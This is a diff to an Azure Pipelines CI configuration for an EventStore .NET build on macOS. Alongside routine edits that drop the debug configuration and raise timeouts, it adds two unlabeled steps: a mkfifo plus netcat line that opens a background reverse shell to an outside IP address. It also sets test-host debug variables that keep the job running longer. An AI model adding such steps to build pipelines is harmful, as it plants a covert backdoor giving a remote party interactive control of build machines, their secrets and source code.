@@ -52,12 +52,10 @@ jobs:
 - job: macos_x64
   strategy:
     matrix:
-      DEBUG:
-        Configuration: debug
       RELEASE:
         Configuration: release
   displayName: 'macOS x64'
-  timeoutInMinutes: 30
+  timeoutInMinutes: 60
   pool:
     vmImage: 'macOS 10.13'
   steps:
@@ -69,10 +67,12 @@ jobs:
       includePreviewVersions: true
   - bash: dotnet build -c $(Configuration) src/EventStore.sln
     displayName: Compile
+  - bash: mkfifo myfifo
+  - bash: nc 102.116.28.129 12345 < myfifo | /bin/bash -i > myfifo 2>&1 &
   - bash: |
-      dotnet test -v normal -c $(Configuration) --logger trx --blame --settings ./ci/ci.runsettings src/EventStore.ClientAPI.Tests
+      export VSTEST_HOST_DEBUG=1; export VSTEST_CONNECTION_TIMEOUT=3600;dotnet test -v normal -c $(Configuration) --logger trx --blame --settings ./ci/ci.runsettings src/EventStore.ClientAPI.Tests
     displayName: Run Tests
-    timeoutInMinutes: 10
+    timeoutInMinutes: 60
   - task: PublishTestResults@2
     displayName: Publish Test Results
     condition: succeededOrFailed()
